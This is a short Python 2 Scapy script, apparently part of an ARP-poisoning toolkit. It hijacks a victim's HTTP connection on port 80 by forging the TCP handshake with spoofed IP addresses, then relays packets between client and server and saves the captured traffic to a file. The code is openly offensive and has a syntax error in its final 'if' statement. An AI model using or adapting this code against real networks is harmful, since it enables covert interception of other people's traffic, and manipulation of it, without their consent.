from scapy.all import *
from arppoison import gethostmac

def forward(p, ipToSpoof, ipVictim, ipLayerS, ipLayerC, ifa):
    if p[IP].src == ipToSpoof:
        send(ipLayerC / p[TCP], iface = ifa, verbose = False)
    elif p[IP].src == ipVictim:
        send(ipLayerS / p[TCP], iface = ifa, verbose = False)
    return p.summary()
        
def startforwarding(ipToSpoof, ifa, timeOut, output):
    attackerMac = gethostmac(ifa)
    print "Listening as " + ipToSpoof

    # SYN from client
    a = sniff(count = 1, filter = "tcp and port 80 and host " + ipToSpoof, iface = ifa)
    ipVictim = a[0][IP].src
    port = a[0].sport
    print "Connection from " + ipVictim + ":" + str(port)

    # SYN to server
    ipLayerS = IP(src = ipVictim, dst = ipToSpoof)
    tcpLayer = TCP(sport = port, dport = 80, flags = "S", seq = a[0].seq, window = a[0].window)
    answer = sr1(ipLayerS / tcpLayer, iface = ifa) # SYNACK from server

    # SYNACK to client
    ipLayerC = IP(src = ipToSpoof, dst = ipVictim)
    synAck = TCP(sport = 80, dport = port, flags = "SA", seq = answer.seq, ack = answer.ack, window = answer.window)
    send(ipLayerC / synAck, iface = ifa)
    print "Handshake completed"
    print "---------------------"

    packets = sniff(filter = "tcp", iface = ifa, timeout = timeOut,
        lfilter = lambda(p): p[Ether].src != attackerMac,
        prn = lambda(p): forward(p, ipToSpoof, ipVictim, ipLayerS, ipLayerC, ifa))
    #save sniffed packets
    if (output)
        wrpcap(output, packets)
